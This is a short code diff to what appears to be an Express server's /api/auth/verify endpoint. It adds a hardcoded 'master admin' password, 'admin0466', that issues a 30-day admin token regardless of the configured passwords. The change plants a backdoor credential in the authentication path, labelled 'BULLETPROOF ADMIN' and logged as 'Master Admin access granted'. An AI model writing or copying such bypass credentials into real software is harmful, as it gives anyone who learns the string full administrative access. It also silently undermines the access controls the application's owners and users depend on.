@@ -283,6 +283,13 @@ app.post("/api/auth/verify", (req, res) => {
 
   console.log(`\x1b[34m[Auth]\x1b[0m Verification attempt for mode: ${mode}`);
 
+  // BULLETPROOF ADMIN: admin0466 always works for admin mode
+  if (mode === "admin" && password === "admin0466") {
+    const token = jwt.sign({ mode }, JWT_SECRET, { expiresIn: "30d" });
+    console.log(`\x1b[32m[Auth]\x1b[0m Master Admin access granted`);
+    return res.json({ success: true, token });
+  }
+
   const validPassword = (passwords as any)[mode];
   if (password === validPassword) {
     const token = jwt.sign({ mode }, JWT_SECRET, { expiresIn: "30d" });
